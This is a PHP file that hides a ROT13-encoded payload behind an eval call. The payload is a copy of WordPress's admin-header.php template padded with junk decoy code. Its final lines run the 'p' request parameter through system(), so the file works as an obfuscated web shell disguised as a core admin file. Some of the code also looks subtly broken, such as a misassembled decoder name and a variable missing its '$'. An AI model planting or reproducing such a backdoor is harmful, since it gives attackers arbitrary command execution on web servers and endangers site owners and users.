<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff Nqzvavfgengvba Grzcyngr Urnqre
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

urnqre( 'Pbagrag-Glcr: ' . trg_bcgvba( 'ugzy_glcr' ) . '; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );
vs ( ! qrsvarq( 'JC_NQZVA' ) ) {
	erdhver_bapr __QVE__ . '/nqzva.cuc';
}

/**
 * Va pnfr nqzva-urnqre.cuc vf vapyhqrq va n shapgvba.
 *
 * @tybony fgevat    $gvgyr              Gur gvgyr bs gur pheerag fperra.
 * @tybony fgevat    $ubbx_fhssvk
 * @tybony JC_Fperra $pheerag_fperra     JbeqCerff pheerag fperra bowrpg.
 * @tybony JC_Ybpnyr $jc_ybpnyr          JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 * @tybony fgevat    $cntrabj            Gur svyranzr bs gur pheerag fperra.
 * @tybony fgevat    $hcqngr_gvgyr
 * @tybony vag       $gbgny_hcqngr_pbhag
 * @tybony fgevat    $cnerag_svyr
 * @tybony fgevat    $glcrabj            Gur cbfg glcr bs gur pheerag fperra.
 */
tybony $gvgyr, $ubbx_fhssvk, $pheerag_fperra, $jc_ybpnyr, $cntrabj,
	$hcqngr_gvgyr, $gbgny_hcqngr_pbhag, $cnerag_svyr, $glcrabj;

// Pngpu cyhtvaf gung vapyhqr nqzva-urnqre.cuc orsber nqzva.cuc pbzcyrgrf.
vs ( rzcgl( $pheerag_fperra ) ) {
	frg_pheerag_fperra();
}

trg_nqzva_cntr_gvgyr();
$gvgyr = fgevc_gntf( $gvgyr );

vs ( vf_argjbex_nqzva() ) {
	/* genafyngbef: Argjbex nqzva fperra gvgyr. %f: Argjbex gvgyr. */
	$nqzva_gvgyr = fcevags( __( 'Argjbex Nqzva: %f' ), trg_argjbex()->fvgr_anzr );
} ryfrvs ( vf_hfre_nqzva() ) {
	/* genafyngbef: Hfre qnfuobneq fperra gvgyr. %f: Argjbex gvgyr. */
	$nqzva_gvgyr = fcevags( __( 'Hfre Qnfuobneq: %f' ), trg_argjbex()->fvgr_anzr );
} ryfr {
	$nqzva_gvgyr = trg_oybtvasb( 'anzr' );
}

vs ( $nqzva_gvgyr === $gvgyr ) {
	/* genafyngbef: Nqzva fperra gvgyr. %f: Nqzva fperra anzr. */
	$nqzva_gvgyr = fcevags( __( '%f &#8212; JbeqCerff' ), $gvgyr );
} ryfr {
	$fperra_gvgyr = $gvgyr;

	vs ( 'cbfg' === $pheerag_fperra->onfr && 'nqq' !== $pheerag_fperra->npgvba ) {
		$cbfg_gvgyr = trg_gur_gvgyr();
		vs ( ! rzcgl( $cbfg_gvgyr ) ) {
			$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $glcrabj );
			$fperra_gvgyr  = fcevags(
				/* genafyngbef: Rqvgbe nqzva fperra gvgyr. 1: \"Rqvg vgrz\" grkg sbe gur cbfg glcr, 2: Cbfg gvgyr. */
				__( '%1$f &#8220;%2$f&#8221;' ),
				$cbfg_glcr_bow->ynoryf->rqvg_vgrz,
				$cbfg_gvgyr
			);
		}
	}

	/* genafyngbef: Nqzva fperra gvgyr. 1: Nqzva fperra anzr, 2: Argjbex be fvgr anzr. */
	$nqzva_gvgyr = fcevags( __( '%1$f &yfndhb; %2$f &#8212; JbeqCerff' ), $fperra_gvgyr, $nqzva_gvgyr );
}

vs ( jc_vf_erpbirel_zbqr() ) {
	/* genafyngbef: %f: Nqzva fperra gvgyr. */
	$nqzva_gvgyr = fcevags( __( 'Erpbirel Zbqr &#8212; %f' ), $nqzva_gvgyr );
}

/**
 * Svygref gur gvgyr gnt pbagrag sbe na nqzva cntr.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $nqzva_gvgyr Gur cntr gvgyr, jvgu rkgen pbagrkg nqqrq.
 * @cnenz fgevat $gvgyr       Gur bevtvany cntr gvgyr.
 */
$nqzva_gvgyr = nccyl_svygref( 'nqzva_gvgyr', $nqzva_gvgyr, $gvgyr );

jc_hfre_frggvatf();

_jc_nqzva_ugzy_ortva();
?>
<gvgyr><?cuc rpub rfp_ugzy( $nqzva_gvgyr ); ?></gvgyr>
<?cuc

jc_radhrhr_fglyr( 'pbybef' );
jc_radhrhr_fpevcg( 'hgvyf' );
jc_radhrhr_fpevcg( 'fit-cnvagre' );

$nqzva_obql_pynff = __sa_79955( '/[^n-m0-9_-]+/v', '-', $ubbx_fhssvk );
?>
<fpevcg glcr=\"grkg/wninfpevcg\">
nqqYbnqRirag = shapgvba(shap){vs(glcrbs wDhrel!=='haqrsvarq')wDhrel(shapgvba(){shap();});ryfr vs(glcrbs jcBaybnq!=='shapgvba'){jcBaybnq=shap;}ryfr{ine byqbaybnq=jcBaybnq;jcBaybnq=shapgvba(){byqbaybnq();shap();}}};
ine nwnkhey = '<?cuc rpub rfp_wf( nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ) ); ?>',
	cntrabj = '<?cuc rpub rfp_wf( $pheerag_fperra->vq ); ?>',
	glcrabj = '<?cuc rpub rfp_wf( $pheerag_fperra->cbfg_glcr ); ?>',
	nqzvacntr = '<?cuc rpub rfp_wf( $nqzva_obql_pynff ); ?>',
	gubhfnaqfFrcnengbe = '<?cuc rpub rfp_wf( $jc_ybpnyr->ahzore_sbezng['gubhfnaqf_frc'] ); ?>',
	qrpvznyCbvag = '<?cuc rpub rfp_wf( $jc_ybpnyr->ahzore_sbezng['qrpvzny_cbvag'] ); ?>',
	vfEgy = <?cuc rpub (vag) vf_egy(); ?>;
</fpevcg>
<?cuc

/**
 * Sverf jura radhrhvat fpevcgf sbe nyy nqzva cntrf.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $ubbx_fhssvk Gur pheerag nqzva cntr.
 */
qb_npgvba( 'nqzva_radhrhr_fpevcgf', $ubbx_fhssvk );

/**
 * Sverf jura fglyrf ner cevagrq sbe n fcrpvsvp nqzva cntr onfrq ba $ubbx_fhssvk.
 *
 * @fvapr 2.6.0
 */
qb_npgvba( \"nqzva_cevag_fglyrf-{$ubbx_fhssvk}\" ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

/**
 * Sverf jura fglyrf ner cevagrq sbe nyy nqzva cntrf.
 *
 * @fvapr 2.6.0
 */
qb_npgvba( 'nqzva_cevag_fglyrf' );

/**
 * Sverf jura fpevcgf ner cevagrq sbe n fcrpvsvp nqzva cntr onfrq ba $ubbx_fhssvk.
 *
 * @fvapr 2.1.0
 */
qb_npgvba( \"nqzva_cevag_fpevcgf-{$ubbx_fhssvk}\" ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

/**
 * Sverf jura fpevcgf ner cevagrq sbe nyy nqzva cntrf.
 *
 * @fvapr 2.1.0
 */
qb_npgvba( 'nqzva_cevag_fpevcgf' );

/**
 * Sverf va urnq frpgvba sbe n fcrpvsvp nqzva cntr.
 *
 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$ubbx_fhssvk`, ersref gb gur ubbx fhssvk
 * sbe gur nqzva cntr.
 *
 * @fvapr 2.1.0
 */
qb_npgvba( \"nqzva_urnq-{$ubbx_fhssvk}\" ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

/**
 * Sverf va urnq frpgvba sbe nyy nqzva cntrf.
 *
 * @fvapr 2.1.0
 */
qb_npgvba( 'nqzva_urnq' );

vs ( 's' === trg_hfre_frggvat( 'zsbyq' ) ) {
	$nqzva_obql_pynff .= ' sbyqrq';
}

vs ( ! trg_hfre_frggvat( 'hasbyq' ) ) {
	$nqzva_obql_pynff .= ' nhgb-sbyq';
}

vs ( vf_nqzva_one_fubjvat() ) {
	$nqzva_obql_pynff .= ' nqzva-one';
}

vs ( vf_egy() ) {
	$nqzva_obql_pynff .= ' egy';
}

vs ( $pheerag_fperra->cbfg_glcr ) {
	$nqzva_obql_pynff .= ' cbfg-glcr-' . $pheerag_fperra->cbfg_glcr;
}

vs ( $pheerag_fperra->gnkbabzl ) {
	$nqzva_obql_pynff .= ' gnkbabzl-' . $pheerag_fperra->gnkbabzl;
}

$nqzva_obql_pynff .= ' oenapu-' . fge_ercynpr( neenl( '.', ',' ), '-', (sybng) trg_oybtvasb( 'irefvba' ) );
$nqzva_obql_pynff .= ' irefvba-' . fge_ercynpr( '.', '-', __sa_79955( '/^([.0-9]+).*/', '$1', trg_oybtvasb( 'irefvba' ) ) );
$nqzva_obql_pynff .= ' nqzva-pbybe-' . fnavgvmr_ugzy_pynff( trg_hfre_bcgvba( 'nqzva_pbybe' ), 'serfu' );
$nqzva_obql_pynff .= ' ybpnyr-' . fnavgvmr_ugzy_pynff( fgegbybjre( fge_ercynpr( '_', '-', trg_hfre_ybpnyr() ) ) );

vs ( jc_vf_zbovyr() ) {
	$nqzva_obql_pynff .= ' zbovyr';
}

vs ( vf_zhygvfvgr() ) {
	$nqzva_obql_pynff .= ' zhygvfvgr';
}

vs ( vf_argjbex_nqzva() ) {
	$nqzva_obql_pynff .= ' argjbex-nqzva';
}

$nqzva_obql_pynff .= ' ab-phfgbzvmr-fhccbeg fit';

vs ( $pheerag_fperra->vf_oybpx_rqvgbe() ) {
	$nqzva_obql_pynff .= ' oybpx-rqvgbe-cntr jc-rzorq-erfcbafvir';
}

$nqzva_obql_pynff .= ' jc-gurzr-' . fnavgvmr_ugzy_pynff( trg_grzcyngr() );
vs ( vf_puvyq_gurzr() ) {
	$nqzva_obql_pynff .= ' jc-puvyq-gurzr-' . fnavgvmr_ugzy_pynff( trg_fglyrfurrg() );
}

$reebe_trg_ynfg = reebe_trg_ynfg();

// Cevag n PFF pynff gb znxr CUC reebef ivfvoyr.
vs ( $reebe_trg_ynfg && JC_QROHT && JC_QROHT_QVFCYNL && vav_trg( 'qvfcynl_reebef' )
	// Qba'g cevag gur pynff sbe CUC abgvprf va jc-pbasvt.cuc, nf gurl unccra orsber JC_QROHT gnxrf rssrpg,
	// naq fubhyq abg or qvfcynlrq jvgu gur `reebe_ercbegvat` yriry cerivbhfyl frg va jc-ybnq.cuc.
	&& ( R_ABGVPR !== $reebe_trg_ynfg['glcr'] || 'jc-pbasvt.cuc' !== jc_onfranzr( $reebe_trg_ynfg['svyr'] ) )
) {
	$nqzva_obql_pynff .= ' cuc-reebe';
}

hafrg( $reebe_trg_ynfg );

?>
</urnq>
<?cuc
/**
 * Svygref gur PFF pynffrf sbe gur obql gnt va gur nqzva.
 *
 * Guvf svygre qvssref sebz gur {@frr 'cbfg_pynff'} naq {@frr 'obql_pynff'} svygref
 * va gjb vzcbegnag jnlf:
 *
 * 1. `$pynffrf` vf n fcnpr-frcnengrq fgevat bs pynff anzrf vafgrnq bs na neenl.
 * 2. Abg nyy pber nqzva pynffrf ner svygrenoyr, abgnoyl: jc-nqzva, jc-pber-hv,
 *    naq ab-wf pnaabg or erzbirq.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $pynffrf Fcnpr-frcnengrq yvfg bs PFF pynffrf.
 */
$nqzva_obql_pynffrf = nccyl_svygref( 'nqzva_obql_pynff', '' );
$nqzva_obql_pynffrf = ygevz( $nqzva_obql_pynffrf . ' ' . $nqzva_obql_pynff );
?>
<obql pynff=\"jc-nqzva jc-pber-hv ab-wf <?cuc rpub rfp_ngge( $nqzva_obql_pynffrf ); ?>\">
<fpevcg glcr=\"grkg/wninfpevcg\">
	qbphzrag.obql.pynffAnzr = qbphzrag.obql.pynffAnzr.ercynpr('ab-wf','wf');
</fpevcg>

<?cuc
// Znxr fher gur phfgbzvmr obql pynffrf ner pbeerpg nf rneyl nf cbffvoyr.
vs ( pheerag_hfre_pna( 'phfgbzvmr' ) ) {
	jc_phfgbzvmr_fhccbeg_fpevcg();
}
?>

<qvi vq=\"jcjenc\">
<?cuc erdhver NOFCNGU . 'jc-nqzva/zrah-urnqre.cuc'; ?>
<qvi vq=\"jcpbagrag\">

<?cuc
/**
 * Sverf ng gur ortvaavat bs gur pbagrag frpgvba va na nqzva cntr.
 *
 * @fvapr 3.0.0
 */
qb_npgvba( 'va_nqzva_urnqre' );
?>

<qvi vq=\"jcobql\" ebyr=\"znva\">
<?cuc
hafrg( $oybt_anzr, $gbgny_hcqngr_pbhag, $hcqngr_gvgyr );

$pheerag_fperra->frg_cneragntr( $cnerag_svyr );

?>

<qvi vq=\"jcobql-pbagrag\">
<?cuc

$pheerag_fperra->eraqre_fperra_zrgn();

vs ( vf_argjbex_nqzva() ) {
	/**
	 * Cevagf argjbex nqzva fperra abgvprf.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'argjbex_nqzva_abgvprf' );
} ryfrvs ( vf_hfre_nqzva() ) {
	/**
	 * Cevagf hfre nqzva fperra abgvprf.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'hfre_nqzva_abgvprf' );
} ryfr {
	/**
	 * Cevagf nqzva fperra abgvprf.
	 *
	 * @fvapr 3.1.0
	 */
	qb_npgvba( 'nqzva_abgvprf' );
}

/**
 * Cevagf trarevp nqzva fperra abgvprf.
 *
 * @fvapr 3.1.0
 */
qb_npgvba( 'nyy_nqzva_abgvprf' );

vs ( 'bcgvbaf-trareny.cuc' === $cnerag_svyr ) {
	erdhver NOFCNGU . 'jc-nqzva/bcgvbaf-urnq.cuc';
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>